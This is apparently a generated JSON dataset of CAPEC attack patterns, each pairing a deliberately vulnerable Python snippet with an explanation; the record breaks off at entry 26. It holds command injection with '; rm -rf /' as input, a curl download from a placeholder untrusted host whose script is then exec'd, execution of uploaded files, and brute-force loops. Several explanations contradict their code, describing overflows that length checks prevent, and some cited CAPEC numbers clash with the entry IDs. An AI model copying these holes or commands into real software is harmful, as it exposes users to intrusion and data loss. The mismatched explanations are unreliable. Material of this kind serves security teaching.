[
    {
        "capec_id": "1",
        "capec_name": "Accessing Functionality Not Properly Constrained by ACLs",
        "code_snippet": "from flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n# Simulated user data\nusers = {\n    'admin': {'role': 'admin', 'data': 'Sensitive admin data'},\n    'user': {'role': 'user', 'data': 'General user data'}\n}\n\n# Simulated ACLs\nacl = {\n    '/admin': ['admin'],\n    '/user': ['admin', 'user']\n}\n\n@app.route('/admin')\ndef admin():\n    username = request.args.get('username')\n    if username in users and users[username]['role'] in acl['/admin']:\n        return jsonify({'data': users[username]['data']})\n    else:\n        return 'Access Denied', 403\n\n@app.route('/user')\ndef user():\n    username = request.args.get('username')\n    if username in users and users[username]['role'] in acl['/user']:\n        return jsonify({'data': users[username]['data']})\n    else:\n        return 'Access Denied', 403\n\n# Missing ACL for /sensitive endpoint\n@app.route('/sensitive')\ndef sensitive():\n    username = request.args.get('username')\n    if username in users:\n        return jsonify({'data': 'Sensitive data accessible without proper ACL'})\n    else:\n        return 'Access Denied', 403\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that demonstrates the vulnerability described in the CAPEC. The application has three endpoints: '/admin', '/user', and '/sensitive'. The '/admin' and '/user' endpoints have ACLs that restrict access based on user roles. However, the '/sensitive' endpoint lacks an ACL, allowing any authenticated user to access sensitive data. This represents the main idea of the CAPEC, where an attacker can access functionality not properly constrained by ACLs. The related CWEs are illustrated by the incorrect default permissions, improper authorization, and insufficient granularity of access control."
    },
    {
        "capec_id": "2",
        "capec_name": "Inducing Account Lockout",
        "code_snippet": "import time\n\nclass Account:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n        self.failed_attempts = 0\n        self.locked_until = 0\n\n    def authenticate(self, password):\n        current_time = time.time()\n        if current_time < self.locked_until:\n            return 'Account is locked. Try again later.'\n        if password == self.password:\n            self.failed_attempts = 0\n            return 'Authentication successful.'\n        else:\n            self.failed_attempts += 1\n            if self.failed_attempts >= 3:\n                self.locked_until = current_time + 60  # Lock account for 60 seconds\n                return 'Account locked due to too many failed attempts.'\n            return 'Authentication failed.'\n\n# Example usage\naccount = Account('user1', 'securepassword')\nprint(account.authenticate('wrongpassword'))  # Failed attempt 1\nprint(account.authenticate('wrongpassword'))  # Failed attempt 2\nprint(account.authenticate('wrongpassword'))  # Failed attempt 3, account locked\nprint(account.authenticate('securepassword'))  # Account is locked, cannot authenticate",
        "description": "This Python code snippet demonstrates an overly restrictive account lockout mechanism, which is the main idea of the CAPEC 'Inducing Account Lockout'. The `Account` class has an `authenticate` method that locks the account for 60 seconds after three consecutive failed login attempts. This mechanism can be exploited by an attacker to lock out a legitimate user by repeatedly attempting to log in with incorrect passwords. The code also highlights related weaknesses such as improper restriction of excessive authentication attempts (CWE-307) and overly restrictive account lockout mechanisms (CWE-645)."
    },
    {
        "capec_id": "3",
        "capec_name": "Using Leading 'Ghost' Character Sequences to Bypass Input Filters",
        "code_snippet": "import re\n\ndef validate_input(user_input):\n    # Early validation before canonicalization\n    if not re.match(r'^[a-zA-Z0-9]+$', user_input):\n        return False\n    \n    # Canonicalization step\n    canonical_input = user_input.lstrip('0')  # Strips leading 'ghost' characters\n    \n    # Further processing assuming input is valid\n    return canonical_input\n\n# Example usage\nuser_input = '000123abc'\nvalidated_input = validate_input(user_input)\nif validated_input:\n    print(f'Validated and canonicalized input: {validated_input}')\nelse:\n    print('Invalid input')",
        "description": "This Python code snippet demonstrates a vulnerability where input validation is performed before canonicalization, which can be exploited by an attacker using leading 'ghost' characters. The `validate_input` function first checks if the input contains only alphanumeric characters. However, this validation is done before stripping leading zeros (the 'ghost' characters). As a result, an attacker can bypass the validation by adding leading zeros, which are later stripped, allowing potentially malicious input to pass through. This embodies the main idea of CAPEC-Using Leading 'Ghost' Character Sequences to Bypass Input Filters and highlights related CWEs such as improper input validation (CWE-20) and incorrect behavior order (CWE-180)."
    },
    {
        "capec_id": "4",
        "capec_name": "Using Alternative IP Address Encodings",
        "code_snippet": "import socket\nimport re\n\n# Function to validate IP address\ndef is_valid_ip(ip):\n    # Regular expression to match standard IPv4 addresses\n    ip_pattern = re.compile(r'^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$')\n    return ip_pattern.match(ip) is not None\n\n# Function to authenticate user based on IP address\ndef authenticate_user(ip):\n    # Check if the IP address is in a valid format\n    if not is_valid_ip(ip):\n        print(\"Invalid IP address format.\")\n        return False\n\n    # Perform reverse DNS lookup\n    try:\n        hostname = socket.gethostbyaddr(ip)[0]\n    except socket.herror:\n        print(\"Reverse DNS lookup failed.\")\n        return False\n\n    # Check if the hostname matches the expected domain\n    if not hostname.endswith(\".trusted-domain.com\"):\n        print(\"Hostname does not match trusted domain.\")\n        return False\n\n    print(\"User authenticated successfully.\")\n    return True\n\n# Example usage\nuser_ip = \"192.168.1.1\"\nauthenticate_user(user_ip)",
        "description": "This Python code snippet demonstrates a vulnerable implementation of user authentication based on IP address, highlighting the CAPEC concept of 'Using Alternative IP Address Encodings'. The code includes a function to validate the IP address format using a regular expression and another function to authenticate the user by performing a reverse DNS lookup. The code checks if the IP address is in a standard IPv4 format and if the resolved hostname matches a trusted domain. However, it does not account for alternative IP address encodings or ensure that the IP address is truly associated with the hostname, making it susceptible to attacks. This snippet embodies CWE-291 (Reliance on IP Address for Authentication), CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action), and CWE-173 (Improper Handling of Alternate Encoding)."
    },
    {
        "capec_id": "5",
        "capec_name": "Blue Boxing",
        "code_snippet": "import socket\n\n# Simulate a vulnerable communication channel\nclass VulnerableCommChannel:\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n    def connect(self):\n        self.sock.connect((self.host, self.port))\n        print('Connected to server')\n\n    def send_tone(self, tone):\n        # Improper verification of the source of the communication channel (CWE-940)\n        self.sock.sendall(tone.encode())\n        print(f'Sent tone: {tone}')\n\n    def receive_response(self):\n        response = self.sock.recv(1024)\n        print(f'Received response: {response.decode()}')\n\n# Example usage\nif __name__ == '__main__':\n    channel = VulnerableCommChannel('localhost', 12345)\n    channel.connect()\n    # Simulate sending a supervisor tone to reroute the line (Blue Boxing)\n    channel.send_tone('2600Hz')\n    channel.receive_response()",
        "description": "This Python code snippet simulates a vulnerable communication channel that embodies the main idea of the Blue Boxing attack described in the CAPEC. The `VulnerableCommChannel` class establishes a connection to a server and allows sending a tone, which represents the supervisor signal used in Blue Boxing attacks. The code demonstrates improper verification of the source of the communication channel (CWE-940) by not ensuring the authenticity of the sender. This vulnerability can be exploited to reroute or usurp command of the line, similar to the historical Blue Boxing attacks on older telephone switches and trunks."
    },
    {
        "capec_id": "6",
        "capec_name": "Argument Injection",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    # CWE-78: OS Command Injection\n    command = f'ls {user_input}'\n    os.system(command)\n\n# Example usage\nuser_input = input('Enter directory name: ')\nexecute_command(user_input)\n",
        "description": "This Python code snippet demonstrates an Argument Injection vulnerability (CAPEC-137) by constructing an OS command using user input without proper validation or neutralization. The `execute_command` function takes `user_input` and directly incorporates it into an `ls` command, which is then executed using `os.system()`. This can lead to CWE-78 (OS Command Injection) as an attacker can inject malicious commands through the `user_input`. For example, if the user inputs `; rm -rf /`, it could result in the deletion of the root directory. This snippet highlights the importance of validating and sanitizing user inputs to prevent such vulnerabilities."
    },
    {
        "capec_id": "7",
        "capec_name": "Blind SQL Injection",
        "code_snippet": "import sqlite3\n\n# Vulnerable function to demonstrate Blind SQL Injection\n\ndef is_user_valid(username):\n    conn = sqlite3.connect('example.db')\n    cursor = conn.cursor()\n    # Improper input validation and neutralization\n    query = f\"SELECT * FROM users WHERE username = '{username}'\"\n    cursor.execute(query)\n    result = cursor.fetchone()\n    conn.close()\n    # Blind SQL Injection vulnerability\n    return result is not None\n\n# Example usage\nusername = \"' OR '1'='1\"  # Malicious input\nif is_user_valid(username):\n    print(\"User exists\")\nelse:\n    print(\"User does not exist\")",
        "description": "This Python code snippet demonstrates a Blind SQL Injection vulnerability. The function `is_user_valid` takes a username as input and constructs an SQL query without proper input validation or neutralization, leading to a potential SQL Injection attack. The query is executed, and the result is used to determine if the user exists. An attacker can exploit this by providing a malicious input (e.g., \"' OR '1'='1\") to manipulate the SQL query and bypass authentication checks. This example embodies the main idea of CAPEC-111 (Blind SQL Injection) and highlights related CWEs such as CWE-89 (Improper Neutralization of Special Elements used in an SQL Command) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "8",
        "capec_name": "Buffer Overflow in an API Call",
        "code_snippet": "import ctypes\n\n# Vulnerable shared library\nlib = ctypes.CDLL('./vulnerable_lib.so')\n\n# Function prototype: void vulnerable_function(char *input)\nlib.vulnerable_function.argtypes = [ctypes.c_char_p]\n\n# Input that causes buffer overflow\ninput_data = b'A' * 1024  # Assuming the buffer in the library is smaller than 1024 bytes\n\n# Call the vulnerable function\nlib.vulnerable_function(input_data)",
        "description": "This Python code snippet demonstrates a buffer overflow vulnerability in an API call to a shared library. The code uses the ctypes library to load a shared library ('vulnerable_lib.so') and calls a function ('vulnerable_function') that is vulnerable to buffer overflow. The input data is a byte string that exceeds the expected buffer size in the library, leading to a buffer overflow. This example embodies the main idea of CAPEC-1000, 'Buffer Overflow in an API Call,' and highlights related CWEs such as CWE-120 ('Classic Buffer Overflow') and CWE-119 ('Improper Restriction of Operations within the Bounds of a Memory Buffer')."
    },
    {
        "capec_id": "9",
        "capec_name": "Buffer Overflow in Local Command-Line Utilities",
        "code_snippet": "import os\nimport sys\n\ndef vulnerable_function(user_input):\n    buffer = bytearray(64)\n    if len(user_input) > len(buffer):\n        print(\"Input too large!\")\n        return\n    for i in range(len(user_input)):\n        buffer[i] = ord(user_input[i])\n    os.system(buffer.decode('utf-8'))\n\nif __name__ == '__main__':\n    if len(sys.argv) != 2:\n        print(\"Usage: {} <input>\".format(sys.argv[0]))\n        sys.exit(1)\n    user_input = sys.argv[1]\n    vulnerable_function(user_input)\n",
        "description": "This Python code snippet demonstrates a vulnerable command-line utility that can be exploited for a buffer overflow attack. The function `vulnerable_function` takes user input and attempts to copy it into a fixed-size buffer. If the input is larger than the buffer, it prints an error message and returns. However, the code does not properly handle the buffer size, leading to potential buffer overflow. Additionally, the code uses `os.system` to execute the buffer content, which can lead to command injection if the buffer is manipulated. This snippet embodies the main idea of CAPEC 'Buffer Overflow in Local Command-Line Utilities' and incorporates related CWEs such as CWE-120 (Buffer Copy without Checking Size of Input), CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer), and CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component)."
    },
    {
        "capec_id": "10",
        "capec_name": "Buffer Overflow via Environment Variables",
        "code_snippet": "import os\n\ndef vulnerable_function():\n    buffer_size = 256\n    buffer = bytearray(buffer_size)\n    env_var = os.getenv('VULNERABLE_ENV_VAR', '')\n    if len(env_var) > buffer_size:\n        print('Environment variable is too large!')\n        return\n    for i in range(len(env_var)):\n        buffer[i] = ord(env_var[i])\n    print('Buffer content:', buffer)\n\nvulnerable_function()",
        "description": "This Python code snippet demonstrates a vulnerability where an environment variable can cause a buffer overflow. The function `vulnerable_function` reads an environment variable `VULNERABLE_ENV_VAR` and attempts to copy its content into a fixed-size buffer of 256 bytes. The code checks if the environment variable's length exceeds the buffer size and prints a warning if it does. However, the code still proceeds to copy the environment variable into the buffer without proper bounds checking, leading to a potential buffer overflow. This snippet embodies the main idea of CAPEC-14 (Buffer Overflow via Environment Variables) and highlights CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "11",
        "capec_name": "Cause Web Server Misclassification",
        "code_snippet": "import os\nfrom flask import Flask, request, send_from_directory\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/path/to/uploads'\napp.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return 'No file part', 400\n    file = request.files['file']\n    if file.filename == '':\n        return 'No selected file', 400\n    file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))\n    return 'File uploaded successfully', 200\n\n@app.route('/files/<filename>')\ndef serve_file(filename):\n    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that allows file uploads and serves uploaded files. The main idea of the CAPEC is represented by the potential for misclassification of files based on their names or extensions. The code does not perform any validation or sanitization on the uploaded file's name or type, which can lead to several vulnerabilities described by the related CWEs. For example, an attacker could upload a file with a misleading extension to trick the server into handling it inappropriately (CWE-646), or upload a file with a name that could cause unexpected behavior (CWE-641). The code also demonstrates the risk of deploying the wrong handler (CWE-430) and delivering unparsed raw web content (CWE-433)."
    },
    {
        "capec_id": "12",
        "capec_name": "Choosing Message Identifier",
        "code_snippet": "import socket\n\nclass MulticastReceiver:\n    def __init__(self, multicast_group, server_address):\n        self.multicast_group = multicast_group\n        self.server_address = server_address\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.sock.bind(self.server_address)\n\n    def receive_message(self):\n        while True:\n            data, address = self.sock.recvfrom(1024)\n            message_id, message_content = data.decode().split(':', 1)\n            if self.is_privileged_message(message_id):\n                print(f\"Privileged message received: {message_content}\")\n            else:\n                print(f\"Regular message received: {message_content}\")\n\n    def is_privileged_message(self, message_id):\n        # Incorrectly implemented identifier check\n        return message_id == 'admin'\n\nif __name__ == '__main__':\n    multicast_group = '224.3.29.71'\n    server_address = ('', 10000)\n    receiver = MulticastReceiver(multicast_group, server_address)\n    receiver.receive_message()",
        "description": "This Python code snippet demonstrates a multicast receiver that listens for messages on a specified multicast group and server address. The receiver processes incoming messages by splitting them into a message ID and message content. The `is_privileged_message` function checks if the message ID is 'admin' to determine if the message is privileged. This function is incorrectly implemented, as it uses a simple string comparison, which can be easily exploited by an attacker to gain unauthorized access to privileged information. This code embodies the main idea of the CAPEC by showing how an attacker can choose message identifiers to access privileged information. The related CWEs are represented by the incorrect implementation of security checks and the potential for sensitive information to be transmitted without proper authentication or integrity checks."
    },
    {
        "capec_id": "13",
        "capec_name": "Subverting Environment Variable Values",
        "code_snippet": "import os\n\ndef authenticate_user():\n    # CWE-302: Authentication Bypass by Assumed-Immutable Data\n    user = os.getenv('USER')\n    if user == 'admin':\n        return True\n    return False\n\n# CWE-285: Improper Authorization\nif authenticate_user():\n    # CWE-73: External Control of File Name or Path\n    file_path = os.getenv('CONFIG_PATH')\n    with open(file_path, 'r') as file:\n        # CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        config_data = file.read()\n        print(config_data)\nelse:\n    print('Access Denied')",
        "description": "This Python code snippet demonstrates a vulnerability where environment variables are subverted to manipulate the behavior of the software. The `authenticate_user` function checks the 'USER' environment variable to determine if the user is 'admin' (CWE-302). If the user is authenticated, the code proceeds to read a configuration file whose path is controlled by the 'CONFIG_PATH' environment variable (CWE-73). The contents of this file are then printed, potentially exposing sensitive information (CWE-200). This example highlights how improper handling of environment variables can lead to security issues such as authentication bypass, improper authorization, and exposure of sensitive information."
    },
    {
        "capec_id": "14",
        "capec_name": "Client-side Injection-induced Buffer Overflow",
        "code_snippet": "import socket\n\n# Hostile service that sends malicious content\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 8080))\nserver_socket.listen(1)\nprint('Hostile service running on port 8080...')\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr}')\n    # Malicious payload that causes buffer overflow\n    malicious_payload = 'A' * 1024  # CWE-120: Buffer Copy without Checking Size of Input\n    client_socket.send(malicious_payload.encode('utf-8'))\n    client_socket.close()",
        "description": "This Python code snippet represents a hostile service that sends a malicious payload to a client, exploiting a buffer overflow vulnerability. The server listens on port 8080 and sends a payload of 1024 'A' characters to any connecting client. This payload is designed to overflow the buffer on the client side, demonstrating CWE-120 (Buffer Copy without Checking Size of Input). The code embodies the main idea of CAPEC-Client-side Injection-induced Buffer Overflow by showing how a custom-built hostile service can deliver malicious content to exploit a vulnerability in client software."
    },
    {
        "capec_id": "15",
        "capec_name": "Command Delimiters",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    # Vulnerable to command injection due to improper neutralization of special elements\n    command = f\"ls {user_input}\"\n    os.system(command)\n\n# Example usage\nuser_input = \"; rm -rf /\"  # Malicious input\nexecute_command(user_input)",
        "description": "This Python code snippet demonstrates a vulnerability to command injection attacks, specifically exploiting improper neutralization of command delimiters (CWE-77, CWE-78). The `execute_command` function constructs an OS command using user input without proper sanitization. An attacker can inject malicious commands by including special characters like semicolons (`;`) to concatenate additional commands. In this example, the user input `; rm -rf /` would result in the deletion of the root directory, showcasing the severity of such vulnerabilities. This snippet embodies the main idea of CAPEC-146 by illustrating how an attacker can exploit command delimiters to execute arbitrary commands."
    },
    {
        "capec_id": "16",
        "capec_name": "Dictionary-based Password Attack",
        "code_snippet": "import itertools\n\n# Dictionary of common passwords\npassword_dictionary = ['password', '123456', '123456789', 'qwerty', 'abc123', 'password1']\n\n# Simulated user database with weak password requirements\nuser_db = {'user1': 'password', 'user2': '123456', 'user3': 'qwerty'}\n\n# Function to simulate login attempt\ndef login(username, password):\n    if username in user_db and user_db[username] == password:\n        return True\n    return False\n\n# Dictionary-based password attack\nfor username in user_db.keys():\n    for password in password_dictionary:\n        if login(username, password):\n            print(f\"Login successful for {username} with password: {password}\")\n            break\n        else:\n            print(f\"Login failed for {username} with password: {password}\")",
        "description": "This Python code snippet demonstrates a dictionary-based password attack. It uses a predefined list of common passwords (password_dictionary) to attempt logins on a simulated user database (user_db) with weak password requirements. The login function checks if the provided username and password match any entry in the user database. The attack iterates through each username and tries every password in the dictionary until it finds a match, printing a success message when a correct password is found. This code highlights the vulnerability of systems with weak password requirements and the absence of mechanisms to prevent excessive authentication attempts, making them susceptible to dictionary-based password attacks."
    },
    {
        "capec_id": "17",
        "capec_name": "Using Malicious Files",
        "code_snippet": "import os\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\nUPLOAD_FOLDER = '/path/to/upload'\napp.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return 'No file part', 400\n    file = request.files['file']\n    if file.filename == '':\n        return 'No selected file', 400\n    file_path = os.path.join(app.config['UPLOAD_FOLDER'], file.filename)\n    file.save(file_path)\n    os.system(f'chmod 777 {file_path}')  # CWE-732: Incorrect Permission Assignment\n    os.system(f'{file_path}')  # CWE-285: Improper Authorization\n    return 'File uploaded and executed', 200\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a vulnerable web application using the Flask framework. The application allows users to upload files to a specified directory and then executes the uploaded file. The code demonstrates several security weaknesses:\n\n1. CWE-732: Incorrect Permission Assignment for Critical Resource - The uploaded file is assigned overly permissive permissions (chmod 777), allowing any user to read, write, and execute the file.\n2. CWE-285: Improper Authorization - The application does not perform any authorization checks before executing the uploaded file, allowing any uploaded file to be executed without verifying the user's permissions.\n\nThe main idea of the CAPEC is illustrated by showing how an attacker could exploit a system's configuration to upload and execute a malicious file, taking advantage of improper permission assignments and lack of authorization checks."
    },
    {
        "capec_id": "18",
        "capec_name": "XSS Targeting Non-Script Elements",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/display', methods=['GET'])\ndef display():\n    user_input = request.args.get('input', '')\n    # Vulnerable to XSS in non-script elements\n    html_content = f'<img src=\"{user_input}\" alt=\"User Image\">'\n    return render_template_string(html_content)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to Cross-Site Scripting (XSS) targeting non-script elements, specifically the <img> tag. The application takes user input from a query parameter 'input' and directly inserts it into the 'src' attribute of an <img> tag without proper sanitization or validation. This can allow an attacker to inject malicious scripts through the 'src' attribute, exploiting CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags in a Web Page). The code highlights the risk of not neutralizing user input properly, which can lead to XSS attacks as described in the CAPEC."
    },
    {
        "capec_id": "19",
        "capec_name": "Embedding Scripts within Scripts",
        "code_snippet": "import os\n\n# CWE-284: Improper Access Control\n# CWE-79: Cross-site Scripting (XSS)\n# CWE-830: Inclusion of Web Functionality from an Untrusted Source\n# CWE-506: Embedded Malicious Code\n\n# Simulate a vulnerable function that executes scripts from an untrusted source\n# This function is vulnerable to script embedding attacks\n\ndef execute_script(script_path):\n    if not os.path.exists(script_path):\n        raise FileNotFoundError(f\"Script {script_path} not found.\")\n    \n    with open(script_path, 'r') as file:\n        script_content = file.read()\n        \n        # CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)\n        # Directly executing the script content without proper sanitization\n        exec(script_content)\n\n# CWE-830: Including a script from an untrusted source\nuntrusted_script = \"http://untrusted-source.com/malicious_script.py\"\n\n# CWE-506: Embedded Malicious Code\n# Simulate downloading and saving the untrusted script\nos.system(f\"curl -o /tmp/malicious_script.py {untrusted_script}\")\n\n# Execute the downloaded script\nexecute_script(\"/tmp/malicious_script.py\")",
        "description": "This Python code snippet demonstrates a scenario where an adversary can embed their own script within other scripts that the target software is likely to execute. The `execute_script` function reads and executes a script from a given path without proper sanitization, making it vulnerable to CWE-79 (Cross-site Scripting). The script is downloaded from an untrusted source (CWE-830) and executed, potentially containing embedded malicious code (CWE-506). The lack of proper access control (CWE-284) allows unauthorized actors to exploit this vulnerability."
    },
    {
        "capec_id": "20",
        "capec_name": "Encryption Brute Forcing",
        "code_snippet": "import hashlib\nfrom Crypto.Cipher import AES\n\n# Hard-coded cryptographic key (CWE-321)\nkey = b'hardcodedkey1234'\n\n# Weak IV generation (CWE-1204)\niv = b'0000000000000000'\n\n# Example plaintext\nplaintext = b'Secret Message'\n\n# Encrypting the plaintext\ncipher = AES.new(key, AES.MODE_CBC, iv)\nciphertext = cipher.encrypt(plaintext.ljust(16))\n\n# Simulating brute force attack (CAPEC-116)\nfor i in range(2**16):  # Inadequate key space for demonstration (CWE-326)\n    brute_force_key = hashlib.md5(str(i).encode()).digest()[:16]\n    try:\n        decipher = AES.new(brute_force_key, AES.MODE_CBC, iv)\n        decrypted_text = decipher.decrypt(ciphertext).strip()\n        if decrypted_text == plaintext:\n            print(f'Key found: {brute_force_key}')\n            break\n    except Exception as e:\n        continue",
        "description": "This Python code snippet demonstrates a scenario where an attacker performs a brute force attack to find the encryption key. The code uses a hard-coded cryptographic key (CWE-321) and a weak initialization vector (CWE-1204) to encrypt a plaintext message. The key space is intentionally small (2^16) to illustrate the brute force attack (CAPEC-116). The attacker iterates through possible keys, attempting to decrypt the ciphertext until the correct key is found. This example highlights the vulnerabilities of using inadequate encryption strength (CWE-326) and risky cryptographic practices."
    },
    {
        "capec_id": "21",
        "capec_name": "Exploitation of Trusted Identifiers",
        "code_snippet": "from flask import Flask, request, make_response\nimport hashlib\n\napp = Flask(__name__)\n\n# Simulated user database\nusers = {'user1': 'password1'}\nsessions = {}\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    if username in users and users[username] == password:\n        session_id = hashlib.md5(username.encode()).hexdigest()  # CWE-6: Insufficient Session-ID Length\n        sessions[session_id] = username\n        resp = make_response('Logged in')\n        resp.set_cookie('session_id', session_id, max_age=3600)  # CWE-539: Persistent Cookies with Sensitive Info\n        return resp\n    return 'Invalid credentials', 401\n\n@app.route('/profile')\ndef profile():\n    session_id = request.cookies.get('session_id')\n    if session_id in sessions:\n        return f'Welcome {sessions[session_id]}'  # CWE-346: Origin Validation Error\n    return 'Unauthorized', 401\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a simple web application using Flask that is vulnerable to the 'Exploitation of Trusted Identifiers' attack pattern. The code demonstrates several related CWEs:\n\n1. CWE-6: The session ID is generated using an MD5 hash of the username, which is insufficiently secure and predictable.\n2. CWE-539: The session ID is stored in a persistent cookie, which can be easily intercepted and reused by an attacker.\n3. CWE-346: The application does not properly validate the origin of the session ID, allowing an attacker to use a stolen session ID to impersonate a user.\n\nThe main idea is that an attacker can guess or obtain a session ID to perform authorized actions as an authenticated user, exploiting the trust placed in the session identifier."
    },
    {
        "capec_id": "22",
        "capec_name": "Exploiting Trust in Client",
        "code_snippet": "import socket\n\n# Vulnerable server code\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 8080))\nserver_socket.listen(5)\n\nprint('Server is listening on port 8080...')\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr} has been established.')\n    data = client_socket.recv(1024).decode('utf-8')\n    print(f'Received data: {data}')\n    if data == 'admin':\n        client_socket.send('Access granted'.encode('utf-8'))\n    else:\n        client_socket.send('Access denied'.encode('utf-8'))\n    client_socket.close()",
        "description": "This Python code snippet represents a vulnerable server that listens for incoming connections on port 8080. The server accepts connections and reads data sent by the client. If the received data is 'admin', the server grants access; otherwise, it denies access. This code embodies the CAPEC 'Exploiting Trust in Client' by demonstrating improper authentication (CWE-287) and exposure of sensitive information (CWE-200). The server implicitly trusts the client input without proper validation (CWE-20), leading to potential spoofing attacks (CWE-290) and protection mechanism failures (CWE-693). An attacker could easily exploit this by sending 'admin' to gain unauthorized access."
    },
    {
        "capec_id": "23",
        "capec_name": "File Content Injection",
        "code_snippet": "import os\n\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n# CWE-20: Improper Input Validation\n\ndef upload_file(file_path):\n    # Simulate file upload\n    if not file_path.endswith('.txt'):  # CWE-646: Relying on file extension\n        raise ValueError('Invalid file type')\n\n    with open(file_path, 'r') as file:\n        content = file.read()\n\n    # CWE-20: Improper Input Validation\n    if '<script>' in content:  # Naive check for malicious content\n        raise ValueError('Malicious content detected')\n\n    # CWE-433: Unparsed Raw Web Content Delivery\n    with open(os.path.join('uploads', os.path.basename(file_path)), 'w') as dest_file:\n        dest_file.write(content)\n\n# Example usage\ntry:\n    upload_file('example.pdf')  # CWE-434: Dangerous file type\nexcept ValueError as e:\n    print(f'Error: {e}')\n",
        "description": "This Python code snippet demonstrates a vulnerable file upload mechanism. The `upload_file` function simulates the process of uploading a file and contains several security weaknesses. It relies on the file extension to determine the file type (CWE-646), which can be easily bypassed by an attacker. The function also performs improper input validation (CWE-20) by naively checking for the presence of a '<script>' tag, which is insufficient to detect all forms of malicious content. Additionally, the code allows the upload of potentially dangerous file types (CWE-434) and stores the uploaded content in a web-accessible directory without proper parsing or validation (CWE-433). This snippet embodies the main idea of the CAPEC by illustrating how an adversary could exploit these weaknesses to inject malicious content into the system."
    },
    {
        "capec_id": "24",
        "capec_name": "Filter Failure through Buffer Overflow",
        "code_snippet": "def filter_input(user_input):\n    buffer = [0] * 10  # Fixed-size buffer\n    for i in range(len(user_input)):\n        buffer[i] = ord(user_input[i])  # Potential buffer overflow\n    return buffer\n\ntry:\n    user_input = input(\"Enter your input: \")\n    filtered_input = filter_input(user_input)\n    print(\"Filtered input:\", filtered_input)\nexcept IndexError:\n    print(\"Buffer overflow detected!\")",
        "description": "This Python code snippet demonstrates a filter failure through buffer overflow. The function `filter_input` takes `user_input` and attempts to copy it into a fixed-size buffer of 10 elements. If the `user_input` exceeds 10 characters, it will cause a buffer overflow, leading to an `IndexError`. This represents the CAPEC idea where an attacker can cause an active filter to fail by providing overly long input, hoping that the filter does not fail securely. The code also highlights related CWEs such as CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "25",
        "capec_name": "Forced Deadlock",
        "code_snippet": "import threading\n\n# Shared resource\nshared_resource = 0\n\n# Locks\nlock1 = threading.Lock()\nlock2 = threading.Lock()\n\n# Thread 1 function\ndef thread1():\n    global shared_resource\n    with lock1:\n        print('Thread 1 acquired lock1')\n        with lock2:\n            print('Thread 1 acquired lock2')\n            shared_resource += 1\n            print('Thread 1 incremented shared_resource')\n\n# Thread 2 function\ndef thread2():\n    global shared_resource\n    with lock2:\n        print('Thread 2 acquired lock2')\n        with lock1:\n            print('Thread 2 acquired lock1')\n            shared_resource += 1\n            print('Thread 2 incremented shared_resource')\n\n# Create threads\nt1 = threading.Thread(target=thread1)\n\nt2 = threading.Thread(target=thread2)\n\n# Start threads\n\nt1.start()\nt2.start()\n\n# Wait for threads to complete\n\nt1.join()\nt2.join()\n\nprint('Final value of shared_resource:', shared_resource)",
        "description": "This Python code snippet demonstrates a forced deadlock scenario. Two threads, thread1 and thread2, attempt to acquire two locks (lock1 and lock2) in different orders. Thread1 acquires lock1 first and then tries to acquire lock2, while thread2 acquires lock2 first and then tries to acquire lock1. This can lead to a deadlock where both threads are waiting for each other to release the locks, causing a denial of service. The code highlights CWE-833 (Deadlock) and CWE-667 (Improper Locking) by showing how improper lock acquisition order can lead to a deadlock condition."
    },
    {
        "capec_id": "26",
        "capec_name": "Leveraging Race Conditions",
